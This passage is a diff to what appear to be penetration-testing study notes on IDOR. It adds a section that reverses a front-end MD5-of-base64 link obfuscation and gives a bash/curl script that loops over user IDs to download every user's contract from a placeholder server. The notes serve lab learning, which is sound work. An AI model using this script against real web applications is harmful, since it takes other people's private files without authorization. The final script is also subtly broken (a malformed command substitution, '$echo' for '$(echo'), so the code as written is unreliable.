@@ -197,6 +197,42 @@ We see that the download functionality is sending a post request with the parame
 ```php
 contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
 ```
+- Function Disclosure
+> Developers may make the mistake of making the obfuscation code available on the front-end. Looking at the source code of the page, we may find how the link hash is generated.
+```javascript
+function downloadContract(uid) {
+    $.redirect("/download.php", {
+        contract: CryptoJS.MD5(btoa(uid)).toString(),
+    }, "POST", "_self");
+}
+```
+*Example obfuscation function*
+- Code Analysis
+Funciton appears to send a post request with the contract parameter. The value it sends is an md5 hash from CryptoJS. The value being hashed is a base64(btoa) encoded string of the UID variable. The UID is our previously discovered UID in the original IDOR. In this case, 1. So all this code does is MD5 the base64 hash of 1 (the UID).
+
+We can test this with the following.
+```bash
+echo -n 1 | base64 -w 0 | md5sum
+```
+> Note: Use `-n` and `-w` to avoiding adding line newlines.
+
+### Exploitation
+Now that we've reversed the obfuscation, we can write another bash script to download everyones contract.
+```bash
+for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
+```
+> Note: We use `tr -d` to remove the trailing " -"
+
+Now we make a post request to actually download the files.
+```bash
+#! /bin/bash
+for i in {1..10}; do
+    for hash in $echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
+        curl -SOJ -X POST -d "contract=$hash" http://server_ip:port/download.php
+    done
+done
+```
+
 ## IDOR in Insecure APIs
 ## Chaining IDOR Vulnerabilities
 
